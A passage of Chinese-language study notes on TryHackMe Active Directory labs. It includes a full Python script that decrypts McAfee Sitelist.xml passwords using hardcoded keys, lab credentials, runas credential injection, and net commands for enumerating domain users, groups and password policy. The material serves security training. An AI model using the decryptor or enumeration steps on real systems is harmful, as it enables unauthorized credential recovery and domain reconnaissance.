<span class="line"><span style="color: #61AFEF">sqlitebrowser</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ma.db</span></span></code></pre></div></div></figure>

<p>打开 <strong>AGENT_REPOSITORIES</strong> 表，提取加密后的密码，用下面这个脚本解密。</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/env python</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Info: </span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#    McAfee Sitelist.xml password decryption tool</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#    Jerome Nokin (@funoverip) - Feb 2016</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Quick howto: </span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#    Search for the XML element &lt;Password Encrypted=&quot;1&quot;&gt;...&lt;/Password&gt;,</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#    and paste the content as argument.</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">#</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">###########################################################################</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span>
<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> base64</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 原脚本是用的 Cryptodome</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># https://pypi.org/project/pycryptodome/</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 从这里看的话，pycryptodome 包安装之后是在 Crypto 底下的</span></span>
<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> Crypto.Cipher </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">DES3</span></span>
<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> Crypto.Hash </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">SHA</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># hardcoded XOR key</span></span>
<span class="line"><span style="color: #D19A66">KEY</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">fromhex</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;12150F10111C1A060A1F1B1817160519&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;utf-8&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">sitelist_xor</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">xs</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">    result </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> i, c </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">enumerate</span><span style="color: #ABB2BF">(xs):</span></span>
<span class="line"><span style="color: #ABB2BF">        cb </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> c.</span><span style="color: #61AFEF">to_bytes</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">byteorder</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;big&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        result </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(cb) </span><span style="color: #56B6C2">^</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">KEY</span><span style="color: #ABB2BF">[i</span><span style="color: #56B6C2">%</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">])).</span><span style="color: #61AFEF">to_bytes</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">byteorder</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;big&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> result</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">des3_ecb_decrypt</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">data</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># hardcoded 3DES key</span></span>
<span class="line"><span style="color: #ABB2BF">    key </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">SHA</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">new</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">b</span><span style="color: #98C379">&#39;&lt;!@#$%^&gt;&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">digest</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># decrypt</span></span>
<span class="line"><span style="color: #ABB2BF">    des3 </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">DES3</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">new</span><span style="color: #ABB2BF">(key, </span><span style="color: #D19A66">DES3</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">MODE_ECB</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    data </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(data) </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">    decrypted </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> des3.</span><span style="color: #61AFEF">decrypt</span><span style="color: #ABB2BF">(data)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> decrypted[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:decrypted.</span><span style="color: #61AFEF">find</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">or</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;empty&gt;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">__name__</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;__main__&quot;</span><span style="color: #ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(sys.argv) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Usage:   </span><span style="color: #D19A66">%s</span><span style="color: #98C379"> &lt;base64 passwd&gt;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> sys.argv[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">])</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Example: </span><span style="color: #D19A66">%s</span><span style="color: #98C379"> &#39;jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==&#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> sys.argv[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">])</span></span>
<span class="line"><span style="color: #ABB2BF">        sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># read arg</span></span>
<span class="line"><span style="color: #ABB2BF">    encrypted_password </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> base64.</span><span style="color: #61AFEF">b64decode</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">], </span><span style="color: #98C379">&quot;utf-8&quot;</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># decrypt</span></span>
<span class="line"><span style="color: #ABB2BF">    passwdXOR </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">sitelist_xor</span><span style="color: #ABB2BF">(encrypted_password)</span></span>
<span class="line"><span style="color: #ABB2BF">    password </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">des3_ecb_decrypt</span><span style="color: #ABB2BF">(passwdXOR).</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;utf-8&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># print out</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Crypted password   : </span><span style="color: #D19A66">%s</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Decrypted password : </span><span style="color: #D19A66">%s</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> password)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<p>python 这个环境不太明白，我在 Kali 中安装包老是提示要我加 <code>--break-package-system</code></p>
<p>看了这个帖子 <a target="_blank" rel="noopener" href="https://www.reddit.com/r/linux4noobs/comments/1f9s3g0/is_it_bad_to_use_pip_install_breakpackagesystem/">Is it bad to use pip install –break-package-system?</a> 发现确实不行，系统有一部分是依赖那些包的，如果升级或者安装把包搞挂了，系统也炸了，解决办法是用虚拟环境来解决，不太懂怎么用，之后去学学。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 如果提示缺库，安装这个</span></span>
<span class="line"><span style="color: #61AFEF">py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pycryptodome</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">py</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mcafee_sitelist_pwd_decrypt.py</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</span></span></code></pre></div></div></figure>

<h3 id="DLC-Python-虚拟环境"><a href="#DLC-Python-虚拟环境" class="headerlink" title="DLC - Python 虚拟环境"></a>DLC - Python 虚拟环境</h3><p><strong>虚拟环境（Virtual Environment）</strong> 是一个独立、隔离的 Python 运行环境。它的核心思想是：</p>
<ol>
<li><strong>隔离性：</strong> 每个虚拟环境都有自己独立的 Python 解释器、<code>pip</code> 工具和 <code>site-packages</code> 目录。</li>
<li><strong>互不干扰：</strong> 当你在一个虚拟环境中安装包时，这些包只会安装到这个虚拟环境的 <code>site-packages</code> 目录中，<strong>不会影响到系统全局的 Python 环境</strong>。</li>
<li><strong>项目专用：</strong> 你可以为每个 Python 项目创建一个独立的虚拟环境，这样不同项目之间所需的依赖库版本就不会冲突。</li>
</ol>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 建立项目目录</span></span>
<span class="line"><span style="color: #61AFEF">mkdir</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">my_project</span></span>
<span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">my_project</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 创建虚拟环境</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这个命令会在当前目录下创建一个名为 YOUR_venv_NAME 的子目录</span></span>
<span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">venv</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">YOUR_venv_NAME</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 激活虚拟环境</span></span>
<span class="line"><span style="color: #56B6C2">source</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">venv/bin/activate</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 安装依赖，会安装到虚拟环境中，而不会安装到系统全局的 Python</span></span>
<span class="line"><span style="color: #61AFEF">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">requests_ntlm</span></span>
<span class="line"><span style="color: #61AFEF">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pycryptodome</span></span></code></pre></div></div></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AD 的攻击面非常大，可以从以下几个方面去缓解：</p>
<ul>
<li>培训用户意识</li>
<li>控制 AD 服务暴露面<ul>
<li>不要暴露在外网，仅在内网可访问并且启用 MFA 的 VPN</li>
</ul>
</li>
<li>启用 NAC 网络访问控制</li>
<li>强制 SMB 签名</li>
<li>遵守最小权限原则</li>
</ul>
<hr>
<h1 id="Enumerating-Active-Directory"><a href="#Enumerating-Active-Directory" class="headerlink" title="Enumerating Active Directory"></a>Enumerating Active Directory</h1><p>这一个房间其实是讲信息收集的，从很多个面，很多种方法去收集信息</p>
<p>根据房间去设置好网卡的 DNS 后，去获取一组凭据。</p>
<ul>
<li>rachael.atkinson</li>
<li>Password: Zjqf3489</li>
</ul>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za.tryhackme.com</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">rachael.atkinson@thmjmp1.za.tryhackme.com</span></span></code></pre></div></div></figure>

<h2 id="凭据注入"><a href="#凭据注入" class="headerlink" title="凭据注入"></a>凭据注入</h2><p>这里用到的是 <code>Runas.exe /netonly</code> ，刚开始不明白他的作用是什么，以为是以域上的用户的权限去执行程序的，实际上是用提供的域和凭据<strong>注入一个临时的应用程序</strong>，之后执行的<strong>网络操作</strong>都用的这个凭据去执行。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">runas.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">\rachael.atkinson cmd.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">dir</span><span style="color: #ABB2BF"> \\za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">SYSVOL</span><span style="color: #ABB2BF">\</span></span></code></pre></div></div></figure>

<img src="/thm_ad/image-20250802133134659.png" class="" title="image-20250802133134659">

<p>可以看到标题栏有 <strong>作为 xxxx 运行</strong> 的提示。</p>
<h3 id="DNS-解析不到域控"><a href="#DNS-解析不到域控" class="headerlink" title="DNS 解析不到域控"></a>DNS 解析不到域控</h3><p>实际上是一个 Windows 下的优先级的问题，因为我外网网卡的跃点数比 OpenVPN 网卡的接口跃点数大，所以 DNS 优先用外置网卡的 DNS 去查询，当然查不到结果。通过调小 OpenVPN 的网卡的跃点数解决。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># NS 手动查询 DNS</span></span>
<span class="line"><span style="color: #ABB2BF">nslookup za.tryhackme.com</span></span>
<span class="line"><span style="color: #ABB2BF">服务器:  </span><span style="color: #D19A66">10.1.2.1</span></span>
<span class="line"><span style="color: #ABB2BF">Address:  </span><span style="color: #D19A66">10.1.2.1</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">*** </span><span style="color: #D19A66">10.1.2.1</span><span style="color: #ABB2BF"> 找不到 za.tryhackme.com: </span><span style="color: #E06C75">Non</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">existent</span><span style="color: #ABB2BF"> domain</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看系统内 DNS</span></span>
<span class="line"><span style="color: #ABB2BF">netsh interface ip show dns</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看接口跃点数</span></span>
<span class="line"><span style="color: #ABB2BF">netsh interface ipv4 show interface</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">Idx     Met         MTU          状态                名称</span></span>
<span class="line"><span style="color: #ABB2BF">---  ----------  ----------  ------------  ---------------------------</span></span>
<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">25</span><span style="color: #ABB2BF">        </span><span style="color: #D19A66">1500</span><span style="color: #ABB2BF">  connected     本地连接 </span><span style="color: #D19A66">2</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #D19A66">7</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">        </span><span style="color: #D19A66">1500</span><span style="color: #ABB2BF">  connected     以太网 </span><span style="color: #D19A66">7</span></span>
<span class="line"><span style="color: #ABB2BF">  </span></span>
<span class="line"><span style="color: #ABB2BF"># 调小跃点数后查询 DNS 解析</span></span>
<span class="line"><span style="color: #ABB2BF">nslookup thmjmp1.za.tryhackme.com</span></span>
<span class="line"><span style="color: #ABB2BF">DNS </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF"> timed out.</span></span>
<span class="line"><span style="color: #ABB2BF">    timeout was </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF"> seconds.</span></span>
<span class="line"><span style="color: #ABB2BF">服务器:  UnKnown</span></span>
<span class="line"><span style="color: #ABB2BF">Address:  </span><span style="color: #D19A66">10.200.68.101</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">名称:    thmjmp1.za.tryhackme.com</span></span>
<span class="line"><span style="color: #ABB2BF">Address:  </span><span style="color: #D19A66">10.200.68.248</span></span></code></pre></div></div></figure>

<h3 id="IP-和-域名"><a href="#IP-和-域名" class="headerlink" title="IP 和 域名"></a>IP 和 域名</h3><ul>
<li>当使用<strong>域名</strong>（hostname）访问时，<strong>首选</strong>的认证协议是 <strong>Kerberos</strong>。这是因为 Kerberos 的设计就是基于服务主体名称（Service Principal Name, SPN），它需要主机名才能正常工作。</li>
<li>当使用 <strong>IP 地址</strong>访问时，Kerberos 认证会<strong>失败</strong>，因为它无法为 IP 地址构建有效的 SPN。在这种情况下，Windows 会<strong>回退（fall back）</strong> 到 <strong>NTLM</strong> 认证。</li>
</ul>
<h2 id="Enumeration-枚举"><a href="#Enumeration-枚举" class="headerlink" title="Enumeration 枚举"></a>Enumeration 枚举</h2><p>这一块就介绍了几种方式去收集 AD 中相关信息的方法。</p>
<h3 id="MMC"><a href="#MMC" class="headerlink" title="MMC"></a>MMC</h3><p>即 Microsoft Management Console，如果是远程管理的话，要装一个 RAST 的组件。</p>
<p>如果是本地访问远端的域，不能直接在 runas 好的 cmd 中运行，要重新开始。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 本地运行</span></span>
<span class="line"><span style="color: #ABB2BF">runas.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">\rachael.atkinson mmc</span></span></code></pre></div></div></figure>

<p>然后添加管理单元，把三个 AD 域的都勾上，再返回到主页右键加好的那些单元，都把域名指定好。</p>
<p><strong>优点</strong></p>
<ul>
<li><strong>全面的视图</strong>：图形用户界面提供了一个极好的方法来全面了解活动目录（AD）环境。</li>
<li><strong>快速搜索</strong>：可以对不同的活动目录对象进行快速搜索。</li>
<li><strong>直接查看更新</strong>：它提供了一种直接的方法来查看特定活动目录对象的更新。</li>
<li><strong>直接修改</strong>：如果我们有足够的权限，可以直接更新现有的活动目录对象或添加新的对象。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>需要远程桌面访问</strong>：图形用户界面需要在执行它的机器上进行远程桌面协议（RDP）访问。</li>
<li><strong>无法广域收集</strong>：虽然搜索单个对象很快，但无法进行全活动目录范围的属性或特征收集。</li>
</ul>
<h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>注意⚠️：这个不能用 runas 来远程操作</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 显示域中所有用户</span></span>
<span class="line"><span style="color: #ABB2BF">net </span><span style="color: #E06C75">user</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看某个用户的信息</span></span>
<span class="line"><span style="color: #ABB2BF">net user zoe.</span><span style="color: #E06C75">marshall</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看域中所有的组</span></span>
<span class="line"><span style="color: #ABB2BF">net </span><span style="color: #E06C75">group</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看组中的成员</span></span>
<span class="line"><span style="color: #ABB2BF">net group </span><span style="color: #98C379">&quot;Tier 1 Admins&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看密码策略</span></span>
<span class="line"><span style="color: #ABB2BF">net </span><span style="color: #E06C75">accounts</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span></code></pre></div></div></figure>

<p>密码策略可以帮助我们更好地猜测在攻击中应该使用哪些单个密码，密码错误多少次锁定账户，又或者是锁定账户的时间。</p>
<p><strong>优点</strong></p>
<ul>
<li><strong>无需额外工具</strong>：不需要安装任何额外的或外部工具，并且这些简单的命令通常不会被蓝队（Blue team，指安全防御团队）监控到。</li>
<li><strong>无需图形界面</strong>：我们不需要图形用户界面（GUI）就可以进行这种枚举。</li>
<li><strong>支持宏语言</strong>：VBScript 和其他常用于钓鱼攻击（phishing payloads）的宏语言原生支持这些命令，因此可以在制作更具体的恶意负载之前，用来枚举关于活动目录（AD）域的初始信息。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>需要加入域</strong>：<code>net</code> 命令必须在已加入域（domain-joined）的机器上执行。如果机器没有加入域，它将默认显示 WORKGROUP（工作组）域的信息。</li>
<li><strong>信息不完整</strong>：<code>net</code> 命令可能无法显示所有信息。例如，如果一个用户是超过十个群组的成员，输出结果中将不会显示所有这些群组。</li>
</ul>
<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerShell 是 cmd 的升级版，最大的区别是提供了 cmdlets（类似方法调用），关于 AD 的 cmdlets 可以参考这个：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps</a></p>
